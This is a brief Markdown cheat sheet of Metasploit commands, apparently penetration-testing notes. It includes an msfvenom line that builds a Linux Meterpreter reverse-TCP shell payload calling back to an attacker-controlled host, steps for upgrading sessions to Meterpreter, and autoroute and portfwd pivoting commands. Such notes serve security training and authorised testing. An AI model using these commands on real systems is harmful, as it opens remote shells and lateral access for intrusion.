# Metasploit

## meterpreter

### Payload generation

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$me LPORT=1234 --format=elf -o /tmp/rev
```

### Upgrading to meterpreter

- Use the `post/multi/manage/shell_to_meterpreter` module to upgrade.
- Use `sessions -u id` to upgrade a session.

## pivoting

```shell
run autoroute -s 10.10.10.0/24
```

```shell
run autoroute -p
```

```shell
portfwd add -l 1234 -p 80 -r $ip
```
